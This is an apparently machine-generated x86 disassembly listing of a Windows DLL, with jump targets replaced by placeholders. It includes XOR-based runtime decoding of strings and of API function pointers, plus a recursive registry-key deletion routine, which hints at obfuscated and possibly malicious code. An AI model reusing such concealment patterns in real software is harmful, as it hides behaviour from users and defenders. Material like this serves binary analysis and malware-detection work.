lea esi [ ebp - 0x324 ]
mov [ ebp - 0x4 ] 0xd
call sub_10040e00
add esp 0xc
mov edx eax
mov ecx 0x13
mov [ ebp - 0x4 ] 0xe
call sub_10022b50
mov ecx esi
call sub_100702e0
lea ecx [ ebp - 0x308 ]
mov [ ebp - 0x4 ] 0x3
call sub_100702e0
mov [ ebp - 0x344 ] 0x8
jmp r-xdata
lea edx [ ebp - 0x5c ]
mov eax 0x11c
call sub_10069020
lea ecx [ ebp - 0x308 ]
push esi
push ecx
call sub_10057f20
push eax
lea edx [ ebp - 0x5c ]
lea esi [ ebp - 0x324 ]
mov [ ebp - 0x4 ] 0xf
call sub_10040e00
add esp 0xc
mov edx eax
mov ecx 0x13
mov [ ebp - 0x4 ] 0x10
call sub_10022b50
mov ecx esi
call sub_100702e0
lea ecx [ ebp - 0x308 ]
call sub_100702e0
lea eax [ ebp - 0x34c ]
mov [ ebp - 0x4 ] 0xffffffff
call sub_10039fc0
mov eax 0x9
jmp r-xdata
sub_1005b4dc
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
xor esi esi
push edi
mov edi [ rw-data ]
mov [ ebp - 0x4 ] esi
mov eax [ edi ]
cmp eax esi
je r-xdata
xor eax eax
mov ebx [ WideCharToMultiByte@IAT ]
or eax 0xffffffff
jmp r-xdata
push 0x1
push eax
call sub_100579de
pop ecx
pop ecx
mov [ ebp - 0x4 ] eax
cmp eax esi
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
push esi
push esi
push [ ebp - 0x8 ]
push eax
push 0xffffffff
push [ edi ]
push esi
push esi
call ebx
test eax eax
je r-xdata
push [ ebp - 0x4 ]
call sub_1001b2d2
pop ecx
jmp r-xdata
lea eax [ ebp - 0x4 ]
push esi
push eax
call sub_1003a6ce
pop ecx
pop ecx
test eax eax
jns r-xdata
add edi 0x4
mov eax [ edi ]
cmp eax esi
jne r-xdata
cmp [ ebp - 0x4 ] esi
je r-xdata
push esi
push esi
push esi
push esi
push 0xffffffff
push eax
push esi
push esi
call ebx
mov [ ebp - 0x8 ] eax
cmp eax esi
je r-xdata
push [ ebp - 0x4 ]
call sub_1001b2d2
pop ecx
mov [ ebp - 0x4 ] esi
sub_1005b573
mov edi edi
push ebp
mov ebp esp
sub esp 0x50
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x1c ]
push ebx
mov ebx [ ebp + 0x24 ]
and [ ebp - 0x48 ] 0x0
and [ ebp - 0x4c ] 0x0
push esi
mov esi [ ebp + 0x20 ]
push edi
mov edi [ ebp + 0x8 ]
lea edx [ ebp - 0x48 ]
push edx
lea edx [ ebp - 0x4c ]
push edx
push eax
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x40 ]
push eax
push ecx
call sub_100332b9
add esp 0x18
push eax
lea eax [ ebp - 0x50 ]
push eax
lea eax [ ebp - 0x40 ]
push eax
call sub_100669c6
fstp [ ebp - 0x44 ]
mov eax [ ebp - 0x4c ]
add esp 0x10
test eax eax
je r-xdata
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_1002839c
test al al
je r-xdata
fld [ ebp - 0x44 ]
shl eax 0x2
push eax
push ecx
fstp [ esp ]
call sub_100079e1
pop ecx
fstp [ ebp - 0x44 ]
pop ecx
lea eax [ ebp - 0x40 ]
cmp [ ebp - 0x50 ] eax
je r-xdata
or [ esi ] 0x1
or [ esi ] 0x2
cmp [ ebp - 0x48 ] 0x0
jne r-xdata
fld [ ebp - 0x44 ]
fstp [ ebx ]
jmp r-xdata
mov eax [ ebp + 0xc ]
mov ecx [ ebp - 0x4 ]
mov [ edi ] eax
mov eax [ ebp + 0x10 ]
mov [ edi + 0x4 ] eax
mov eax edi
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10032529
leave
retn 0x20
sub_1005b640
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
cmp esi ebx
je r-xdata
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x8
push edi
lea edi [ ecx + 0x8 ]
movzx eax [ esi ]
push edi
push eax
call sub_10048b50
mov [ esi ] al
inc esi
add esp 0x8
cmp esi ebx
jne r-xdata
pop edi
sub_1005b690
push ebp
mov ebp esp
push 0xffffffff
push sub_10088d86
mov eax [ fs : 0x0 ]
push eax
sub esp 0xa4
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x14 ] eax
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov edi [ eax ]
test edi edi
je r-xdata
xor eax eax
jmp r-xdata
mov ecx [ r--data ]
xor eax eax
jmp r-xdata
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0xff8e
and edx 0xff
mov [ ebp + eax * 2 - 0x2c ] dx
inc eax
cmp eax 0xb
jb r-xdata
xor eax eax
mov [ ebp - 0x16 ] ax
mov ecx [ edi ]
mov eax [ ecx + 0xc ]
lea edx [ ebp - 0x2c ]
push edx
push eax
call [ lstrcmpW@IAT ]
test eax eax
jne r-xdata
mov edi [ edi + 0x4 ]
test edi edi
jne r-xdata
mov ecx [ edi ]
push ebx
call sub_1000bd80
mov esi eax
test esi esi
jne r-xdata
lea edx [ ebp - 0x74 ]
mov eax 0x2b
call sub_10069020
lea eax [ ebp - 0xac ]
push esi
push eax
call sub_10057f20
xor edi edi
push eax
lea edx [ ebp - 0x74 ]
lea esi [ ebp - 0x90 ]
mov [ ebp - 0x4 ] edi
call sub_10040e00
add esp 0xc
mov edx eax
lea ecx [ edi + 0x17 ]
mov [ ebp - 0x4 ] 0x1
call sub_10022b50
mov esi 0x8
cmp [ ebp - 0x7c ] esi
jb r-xdata
xor edx edx
mov [ ebp - 0x7c ] 0x7
mov [ ebp - 0x80 ] edi
mov [ ebp - 0x90 ] dx
cmp [ ebp - 0x98 ] esi
jb r-xdata
mov ecx [ ebp - 0x90 ]
push ecx
call sub_1000a86e
add esp 0x4
mov eax 0x1
jmp r-xdata
mov eax [ ebp - 0xac ]
push eax
call sub_1000a86e
add esp 0x4
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov ecx [ ebp - 0x14 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn 0x4
sub_1005b7f0
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x18
mov ecx [ ebp + 0x8 ]
mov edx [ rw-data ]
push ebx
push esi
xor eax eax
mov bl 0x38
mov [ esp + 0x8 ] edx
xor [ esp + 0x8 ] bl
xor [ esp + 0x9 ] bl
xor [ esp + 0xa ] bl
xor [ esp + 0xb ] bl
push eax
mov [ esp + 0x20 ] ecx
mov ecx [ rw-data ]
mov [ esp + 0x10 ] ecx
mov ecx [ esp + 0xc ]
xor [ esp + 0x10 ] bl
xor [ esp + 0x11 ] bl
xor [ esp + 0x12 ] bl
xor [ esp + 0x13 ] bl
push eax
lea edx [ esp + 0x18 ]
push edx
push ecx
push eax
push eax
mov [ esp + 0x28 ] 0xd
mov [ esp + 0x2c ] eax
mov [ esp + 0x30 ] eax
call [ esp + 0x24 ]
mov edx [ rw-data ]
mov [ esp + 0xc ] edx
xor [ esp + 0xc ] bl
xor [ esp + 0xd ] bl
xor [ esp + 0xe ] bl
xor [ esp + 0xf ] bl
mov esi eax
push 0xffffffff
push esi
call [ esp + 0x14 ]
mov eax [ rw-data ]
mov [ esp + 0xc ] eax
xor [ esp + 0xc ] bl
xor [ esp + 0xd ] bl
xor [ esp + 0xe ] bl
xor [ esp + 0xf ] bl
push esi
call [ esp + 0x10 ]
mov ecx [ rw-data ]
mov edx [ esp + 0x14 ]
mov [ esp + 0xc ] ecx
xor [ esp + 0xc ] bl
xor [ esp + 0xd ] bl
xor [ esp + 0xe ] bl
xor [ esp + 0xf ] bl
push edx
call [ esp + 0x10 ]
mov eax [ esp + 0x18 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_1005b8d0
mov ecx [ eax ]
cmp [ ecx + 0x15 ] 0x0
jne r-xdata
retn
mov edx [ ecx + 0x8 ]
cmp [ edx + 0x15 ] 0x0
jne r-xdata
mov ecx [ ecx + 0x4 ]
cmp [ ecx + 0x15 ] 0x0
jne r-xdata
mov ecx [ edx ]
cmp [ ecx + 0x15 ] 0x0
jne r-xdata
mov [ eax ] ecx
mov edx [ eax ]
cmp edx [ ecx + 0x8 ]
jne r-xdata
mov [ eax ] edx
retn
lea esp [ esp ]
mov [ eax ] ecx
mov ecx [ ecx + 0x4 ]
cmp [ ecx + 0x15 ] 0x0
je r-xdata
mov edx ecx
mov ecx [ edx ]
cmp [ ecx + 0x15 ] 0x0
je r-xdata
sub_1005b920
mov eax [ edi + 0x4 ]
dec [ eax ]
jne r-xdata
retn
push esi
mov esi [ edi ]
test esi esi
je r-xdata
mov eax [ edi + 0x4 ]
mov [ edi ] 0x0
pop esi
test eax eax
je r-xdata
call sub_100324d0
mov [ edi + 0x4 ] 0x0
push eax
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
sub_1005b959
push 0x14
mov eax sub_10085df6
call sub_10026266
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_1000c927
mov esi [ rw-data ]
and [ ebp - 0x4 ] 0x0
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_1006ef60
mov ecx [ ebp + 0x8 ]
push eax
call sub_1005eec0
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_10003c9c
mov eax edi
call sub_10008d33
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_100680a9
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_10042890
push edi
call sub_10008715
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_100661c2
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_10055e2a
sub_1005b9f6
push 0xc
mov eax sub_100854cf
call sub_100259bb
mov esi ecx
mov [ ebp - 0x18 ] esi
mov edi [ ebp + 0x8 ]
or edi 0x7
cmp edi 0x7ffffffe
jbe r-xdata
xor edx edx
push 0x3
mov eax edi
pop ebx
div ebx
mov ecx [ esi + 0x14 ]
mov [ ebp - 0x14 ] ecx
shr [ ebp - 0x14 ] 0x1
mov edx [ ebp - 0x14 ]
cmp edx eax
jbe r-xdata
mov edi [ ebp + 0x8 ]
jmp r-xdata
and [ ebp - 0x4 ] 0x0
lea eax [ edi + 0x1 ]
push 0x0
push eax
call sub_1004f756
pop ecx
pop ecx
mov [ ebp + 0x8 ] eax
jmp r-xdata
mov edi 0x7ffffffe
mov eax edi
sub eax edx
cmp ecx eax
ja r-xdata
mov ebx [ ebp + 0xc ]
test ebx ebx
je r-xdata
lea edi [ edx + ecx ]
push 0x0
push 0x1
mov ecx esi
call sub_10069470
mov eax [ ebp + 0x8 ]
mov [ esi ] eax
mov [ esi + 0x14 ] edi
mov [ esi + 0x10 ] ebx
cmp edi 0x8
jae r-xdata
cmp [ esi + 0x14 ] 0x8
jb r-xdata
xor ecx ecx
mov [ eax + ebx * 2 ] cx
call sub_10008d33
retn 0x8
mov eax esi
mov eax esi
mov eax [ esi ]
jmp r-xdata
lea ecx [ ebx + ebx ]
push ecx
push eax
push [ ebp + 0x8 ]
call sub_1007f580
add esp 0xc
sub_1005ba59
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x10 ] esp
mov [ ebp - 0x14 ] eax
inc eax
push 0x0
push eax
mov [ ebp - 0x4 ] 0x2
call sub_1004f756
pop ecx
mov [ ebp + 0x8 ] eax
pop ecx
mov eax r-xdata
retn
sub_1005bae3
mov edi edi
push ebp
mov ebp esp
push esi
call sub_1003a6bb
mov ecx [ ebp + 0x8 ]
push ecx
mov [ eax ] ecx
call sub_1002f1fa
pop ecx
mov esi eax
call sub_1005b670
mov [ eax ] esi
pop esi
pop ebp
retn
sub_1005bb10
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_10089bf8
mov eax [ fs : 0x0 ]
push eax
sub esp 0x64
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x5c ] eax
push ebx
push esi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x70 ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
push 0x30
mov esi ecx
lea ecx [ esp + 0x3c ]
push 0x0
push ecx
mov ebx edx
mov [ esp + 0x20 ] eax
mov [ esp + 0x40 ] 0x0
call sub_1007f8f0
mov edx [ esp + 0x54 ]
mov eax [ esp + 0x58 ]
add esp 0xc
cmp [ esi + 0x44 ] 0x0
mov [ esp + 0xc ] edx
mov [ esp + 0x10 ] eax
jne r-xdata
mov eax [ esp + 0x14 ]
push eax
push ebx
lea ecx [ esp + 0x14 ]
push ecx
call [ FileTimeToDosDateTime@IAT ]
mov eax [ esp + 0x34 ]
and eax 0x27
xor ebx ebx
mov [ edi ] ax
cmp [ esi + 0x44 ] ebx
je r-xdata
lea ecx [ esp + 0xc ]
push ecx
lea edx [ esp + 0x4c ]
push edx
call [ FileTimeToLocalFileTime@IAT ]
cmp [ esi + 0x4c ] ebx
je r-xdata
or eax 0x100
mov [ edi ] ax
push ebx
xor eax eax
push r--data
lea ecx [ esp + 0x20 ]
mov [ esp + 0x34 ] 0x7
mov [ esp + 0x30 ] ebx
mov [ esp + 0x20 ] ax
call sub_10034100
lea edx [ esp + 0x18 ]
mov ecx esi
mov [ esp + 0x78 ] ebx
call sub_100347b0
cmp [ esp + 0x2c ] 0x8
mov esi eax
jb r-xdata
mov edx 0x80
or [ edi ] dx
mov eax esi
mov ecx [ esp + 0x70 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
pop ebx
mov ecx [ esp + 0x5c ]
xor ecx esp
call sub_10032529
mov esp ebp
pop ebp
retn 0x4
mov ecx [ esp + 0x18 ]
push ecx
call sub_1000a86e
add esp 0x4
sub_1005bc2f
mov edi edi
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
push ebx
mov ebx [ ebp + 0x14 ]
push esi
push edi
test ebx ebx
jne r-xdata
test edx edx
je r-xdata
test edx edx
jne r-xdata
call sub_1005b670
push 0x16
pop esi
mov [ eax ] esi
mov edi [ ebp + 0xc ]
test edi edi
jne r-xdata
cmp [ ebp + 0xc ] edx
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
test ebx ebx
jne r-xdata
xor eax eax
mov ecx [ ebp + 0x10 ]
test ecx ecx
jne r-xdata
xor eax eax
mov [ edx ] ax
jmp r-xdata
mov eax edx
cmp ebx 0xffffffff
jne r-xdata
xor eax eax
mov [ edx ] ax
jmp r-xdata
mov esi ecx
sub esi edx
mov esi edx
sub esi ecx
test ebx ebx
jne r-xdata
dec edi
je r-xdata
test edi edi
jne r-xdata
dec edi
jne r-xdata
xor ecx ecx
mov [ eax ] cx
dec ebx
jne r-xdata
xor eax eax
cmp ebx 0xffffffff
jne r-xdata
movzx eax [ ecx ]
mov [ esi + ecx ] ax
add ecx 0x2
test ax ax
je r-xdata
jmp r-xdata
movzx ecx [ esi + eax ]
mov [ eax ] cx
add eax 0x2
test cx cx
je r-xdata
mov [ edx ] ax
call sub_1005b670
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
mov ecx [ ebp + 0xc ]
push 0x50
mov [ edx + ecx * 2 - 0x2 ] ax
pop eax
jmp r-xdata
call sub_1004b131
mov eax esi
jmp r-xdata
sub_1005bd10
push ebp
mov ebp esp
push esi
mov esi ecx
mov eax [ esi + 0x10 ]
mov ecx [ ebp + 0x8 ]
push edi
cmp eax ecx
jae r-xdata
mov edi [ ebp + 0xc ]
sub eax ecx
cmp eax edi
jae r-xdata
push r--data
call sub_100651be
test edi edi
je r-xdata
mov edi eax
pop edi
mov eax esi
pop esi
pop ebp
retn 0x8
mov edx [ esi + 0x14 ]
push ebx
cmp edx 0x8
jb r-xdata
mov ebx esi
mov ebx [ esi ]
jmp r-xdata
mov edx esi
mov edx [ esi ]
jmp r-xdata
cmp edx 0x8
jb r-xdata
mov ecx esi
xor edx edx
mov [ ecx + eax * 2 ] dx
mov ecx [ esi ]
xor edx edx
mov [ ecx + eax * 2 ] dx
pop edi
mov eax esi
pop esi
pop ebp
retn 0x8
sub eax edi
add eax eax
push eax
lea eax [ ecx + edi ]
lea eax [ ebx + eax * 2 ]
push eax
lea ecx [ edx + ecx * 2 ]
push ecx
call sub_1007ec40
mov eax [ esi + 0x10 ]
add esp 0xc
sub eax edi
cmp [ esi + 0x14 ] 0x8
mov [ esi + 0x10 ] eax
pop ebx
jb r-xdata
sub_1005bd9b
push 0x28
mov eax sub_10085530
call sub_10026266
and [ ebp - 0x10 ] 0x0
mov edi [ ebp + 0x8 ]
test edi edi
je r-xdata
push 0x5
pop eax
call sub_10008d33
retn
cmp [ edi ] 0x0
jne r-xdata
push 0x1c
call sub_1002e3ac
pop ecx
mov [ ebp + 0x8 ] eax
and [ ebp - 0x4 ] 0x0
test eax eax
je r-xdata
xor eax eax
mov eax [ ebp + 0xc ]
mov eax [ eax ]
mov ecx [ eax + 0x18 ]
test ecx ecx
je r-xdata
lea ecx [ ebp - 0x34 ]
call sub_10025720
add eax 0x1c
mov eax ecx
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
test [ ebp - 0x10 ] 0x1
mov [ edi ] eax
je r-xdata
push eax
lea ecx [ ebp - 0x34 ]
call sub_10060250
mov ecx [ ebp + 0x8 ]
push 0x0
push eax
mov [ ebp - 0x4 ] 0x1
mov [ ebp - 0x10 ] 0x1
call sub_1001a709
jmp r-xdata
sub_1005be20
push ebp
mov ebp esp
push 0xffffffff
push sub_100871f0
mov eax [ fs : 0x0 ]
push eax
sub esp 0x1c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x18 ] esi
add esi 0x1c
mov [ ebp - 0x14 ] 0x2
cmp esi [ ebp + 0x8 ]
je r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
mov ebx 0x7fff
call sub_10071d65
mov edi eax
and edi ebx
cmp [ ebp - 0x14 ] ebx
jbe r-xdata
xor edx edx
mov eax edi
div [ ebp - 0x14 ]
mov ecx [ ebp - 0x18 ]
lea eax [ edx * 8 ]
sub eax edx
lea eax [ ecx + eax * 4 ]
cmp esi eax
je r-xdata
cmp ebx 0xffffffff
je r-xdata
inc [ ebp - 0x14 ]
add esi 0x1c
cmp esi [ ebp + 0x8 ]
jne r-xdata
mov ebx [ esi + 0xc ]
mov ecx [ esi ]
mov edx [ esi + 0x4 ]
mov edi [ esi + 0x8 ]
mov [ ebp - 0x1c ] ebx
mov ebx [ eax ]
mov [ esi ] ebx
mov ebx [ eax + 0x4 ]
mov [ esi + 0x4 ] ebx
mov ebx [ eax + 0x8 ]
mov [ esi + 0x8 ] ebx
mov ebx [ eax + 0xc ]
mov [ esi + 0xc ] ebx
mov [ eax ] ecx
mov [ eax + 0x4 ] edx
mov edx [ ebp - 0x1c ]
mov [ eax + 0x8 ] edi
mov [ eax + 0xc ] edx
mov edx [ eax + 0x10 ]
mov ecx [ esi + 0x10 ]
mov [ esi + 0x10 ] edx
mov [ eax + 0x10 ] ecx
mov edx [ eax + 0x14 ]
mov ecx [ esi + 0x14 ]
mov [ esi + 0x14 ] edx
mov [ eax + 0x14 ] ecx
call sub_10071d65
shl ebx 0xf
and eax 0x7fff
shl edi 0xf
or ebx 0x7fff
or edi eax
cmp ebx [ ebp - 0x14 ]
jb r-xdata
sub_1005bf30
push ebp
mov ebp esp
push ecx
push ebx
mov ebx eax
test ebx ebx
jne r-xdata
push esi
mov esi [ ebp + 0x8 ]
cmp [ esi + 0x120 ] 0x0
jne r-xdata
lea eax [ ebx + 0x1 ]
pop ebx
mov esp ebp
pop ebp
retn 0x18
push edi
push 0x208
push 0x0
push ebx
call sub_1007f8f0
add esp 0xc
cmp [ ebp + 0xc ] 0x0
je r-xdata
pop esi
mov eax 0x1e
pop ebx
mov esp ebp
pop ebp
retn 0x18
lea eax [ ebp + 0xc ]
push eax
call sub_10026420
mov ecx [ ebp + 0xc ]
mov eax 0xcccccccd
mul ecx
shr edx 0x3
imul edx edx 0xfffffff6
add ecx edx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x120 ]
mov [ ebp + 0xc ] ecx
imul ecx ecx 0x208
lea esi [ ecx + eax + 0x1082c ]
add esp 0x4
lea edi [ ebp + 0x14 ]
mov edx 0x104
mov ecx ebx
call sub_10072720
test eax eax
js r-xdata
lea eax [ ebp + 0xc ]
push eax
call sub_10026420
mov ecx [ ebp + 0xc ]
mov eax 0xcccccccd
mul ecx
shr edx 0x3
imul edx edx 0xfffffff6
add ecx edx
mov edx [ esi + 0x120 ]
mov [ ebp + 0xc ] ecx
imul ecx ecx 0x208
lea esi [ ecx + edx + 0x130cc ]
add esp 0x4
lea edi [ ebp - 0x4 ]
mov edx 0x104
mov ecx ebx
call sub_10072720
test eax eax
js r-xdata
je r-xdata
mov ecx [ ebp + 0x14 ]
mov eax 0x104
sub eax ecx
push esi
lea ecx [ ebx + ecx * 2 ]
mov edx 0x7fffffff
call sub_10072780
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
mov eax 0x104
sub eax ecx
push esi
lea ecx [ ebx + ecx * 2 ]
mov edx 0x7fffffff
call sub_10072780
test eax eax
mov edx [ ebp + 0x18 ]
test edx edx
je r-xdata
pop edi
pop esi
mov eax 0x6
pop ebx
mov esp ebp
pop ebp
retn 0x18
mov edx [ ebp + 0x14 ]
test edx edx
je r-xdata
pop edi
pop esi
mov eax 0x4
pop ebx
mov esp ebp
pop ebp
retn 0x18
lea ecx [ ebp + 0xc ]
push ecx
call sub_10026420
mov ecx [ ebp + 0xc ]
mov eax 0xcccccccd
mul ecx
shr edx 0x3
imul edx edx 0xfffffff6
add ecx edx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x120 ]
mov [ ebp + 0xc ] ecx
imul ecx ecx 0x208
add esp 0x4
lea ecx [ ecx + eax + 0x11c7c ]
push ecx
mov esi 0x104
call sub_10050c60
test eax eax
je r-xdata
mov eax edx
lea esi [ eax + 0x2 ]
mov eax edx
lea esi [ eax + 0x2 ]
cmp [ ebp + 0x10 ] 0x0
je r-xdata
pop edi
pop esi
mov eax 0x8
pop ebx
mov esp ebp
pop ebp
retn 0x18
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax esi
sar eax 0x1
je r-xdata
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax esi
sar eax 0x1
je r-xdata
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn 0x18
lea edx [ ebp + 0xc ]
push edx
call sub_10026420
mov esi [ ebp + 0xc ]
mov eax 0xcccccccd
mul esi
shr edx 0x3
imul edx edx 0xfffffff6
add esi edx
mov edx [ ebp + 0x1c ]
add esp 0x4
mov [ ebp + 0xc ] esi
test edx edx
je r-xdata
push edx
mov esi 0x104
call sub_10050c60
test eax eax
je r-xdata
push edx
mov esi 0x104
call sub_10050c60
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
imul esi esi 0x208
mov ecx [ eax + 0x120 ]
lea edx [ esi + ecx + 0x1451c ]
push edx
mov esi 0x104
call sub_10050c60
test eax eax
je r-xdata
mov eax edx
lea edi [ eax + 0x2 ]
mov edi edi
pop edi
pop esi
mov eax 0x7
pop ebx
mov esp ebp
pop ebp
retn 0x18
pop edi
pop esi
mov eax 0x5
pop ebx
mov esp ebp
pop ebp
retn 0x18
pop edi
pop esi
mov eax 0xa
pop ebx
mov esp ebp
pop ebp
retn 0x18
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax edi
sar eax 0x1
je r-xdata
push edx
mov esi 0x104
call sub_10050c60
test eax eax
je r-xdata
mov esi [ ebp + 0xc ]
pop edi
pop esi
mov eax 0x9
pop ebx
mov esp ebp
pop ebp
retn 0x18
sub_1005c1d0
push ebp
mov ebp esp
sub esp 0x630
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
mov esi [ ebp + 0x8 ]
push edi
mov edi [ ebp + 0xc ]
push 0x410
lea eax [ ebp - 0x628 ]
push 0x0
push eax
call sub_1007f8f0
add esp 0xc
push edi
push esi
call [ RegDeleteKeyW@IAT ]
test eax eax
jne r-xdata
lea ecx [ ebp - 0x630 ]
push ecx
push 0x20019
push 0x0
push edi
push esi
call [ RegOpenKeyExW@IAT ]
test eax eax
je r-xdata
pop edi
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x630 ]
push 0x0
push 0x0
push 0x0
push 0x0
lea edx [ ebp - 0x62c ]
push edx
lea eax [ ebp - 0x218 ]
push eax
push 0x0
push ecx
mov [ ebp - 0x62c ] 0x104
call [ RegEnumKeyExW@IAT ]
test eax eax
jne r-xdata
sub eax 0x2
neg eax
sbb eax eax
pop edi
and eax 0x2
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x630 ]
push ecx
call [ RegCloseKey@IAT ]
push edi
push esi
call [ RegDeleteKeyW@IAT ]
mov ecx [ ebp - 0x4 ]
neg eax
sbb eax eax
and eax 0xfffffffd
pop edi
xor ecx ebp
add eax 0x3
pop esi
call sub_10032529
mov esp ebp
pop ebp
retn
push ebx
lea esp [ esp ]
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0x30
and edx 0xff
mov [ ebp + eax * 2 - 0x10 ] dx
inc eax
cmp eax 0x5
jb r-xdata
lea ecx [ ebp - 0x218 ]
push ecx
lea edx [ ebp - 0x10 ]
xor eax eax
push edi
push edx
mov ecx 0x208
lea ebx [ ebp - 0x628 ]
mov [ ebp - 0x6 ] ax
call sub_1006d3c0
mov eax ebx
push eax
push esi
call sub_1005c1d0
add esp 0x14
test eax eax
je r-xdata
pop ebx
mov eax [ ebp - 0x630 ]
push 0x0
push 0x0
push 0x0
push 0x0
lea ecx [ ebp - 0x62c ]
push ecx
lea edx [ ebp - 0x218 ]
push edx
push 0x0
push eax
mov [ ebp - 0x62c ] 0x104
call [ RegEnumKeyExW@IAT ]
test eax eax
je r-xdata
mov ecx [ r--data ]
xor eax eax
jmp r-xdata
sub_1005c353
mov edi edi
push ebp
mov ebp esp
push ecx
mov eax 0xffff
cmp [ ebp + 0x8 ] ax
jne r-xdata
mov eax 0x100
cmp [ ebp + 0x8 ] ax
jae r-xdata
xor eax eax
leave
retn
lea eax [ ebp - 0x4 ]
push eax
push 0x1
lea eax [ ebp + 0x8 ]
push eax
push 0x1
call [ GetStringTypeW@IAT ]
test eax eax
jne r-xdata
movzx eax [ ebp + 0x8 ]
mov ecx [ rw-data ]
movzx eax [ ecx + eax * 2 ]
jmp r-xdata
movzx eax [ ebp - 0x4 ]
and [ ebp - 0x4 ] eax
movzx ecx [ ebp + 0xc ]
and eax ecx
leave
retn
sub_1005c3b0
push ebp
mov ebp esp
push 0xffffffff
push sub_10084f6b
mov eax [ fs : 0x0 ]
push eax
sub esp 0x28
push ebx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
xor ebx ebx
mov [ ebp - 0x10 ] ebx
test eax eax
je r-xdata
mov eax 0x4
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ eax ] ebx
jne r-xdata
push 0x10
call sub_1002e3ac
mov esi eax
add esp 0x4
mov [ ebp - 0x10 ] esi
mov [ ebp - 0x4 ] ebx
test esi esi
je r-xdata
xor esi esi
mov eax [ ebp + 0xc ]
mov eax [ eax ]
mov ecx [ eax + 0x18 ]
test ecx ecx
je r-xdata
lea ecx [ ebp - 0x34 ]
call sub_10025720
add eax 0x1c
mov eax ecx
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0xffffffff
mov [ ecx ] esi
test bl 0x1
je r-xdata
push eax
lea ecx [ ebp - 0x34 ]
call sub_10060250
mov ebx 0x1
mov [ esi + 0x4 ] 0x0
mov [ esi ] r--data
call sub_100575c5
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] edx
jmp r-xdata
sub_1005c469
mov edi edi
push ebp
mov ebp esp
push ecx
cmp [ rw-data ] 0xfffffffe
jne r-xdata
mov eax [ rw-data ]
cmp eax 0xffffffff
jne r-xdata
call sub_10021071
push 0x0
lea ecx [ ebp - 0x4 ]
push ecx
push 0x1
lea ecx [ ebp + 0x8 ]
push ecx
push eax
call [ WriteConsoleW@IAT ]
test eax eax
je r-xdata
mov eax 0xffff
leave
retn
mov ax [ ebp + 0x8 ]
leave
retn
sub_1005c4ab
mov edi edi
push ebp
mov ebp esp
sub esp 0x20
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx [ ebp + 0xc ]
push esi
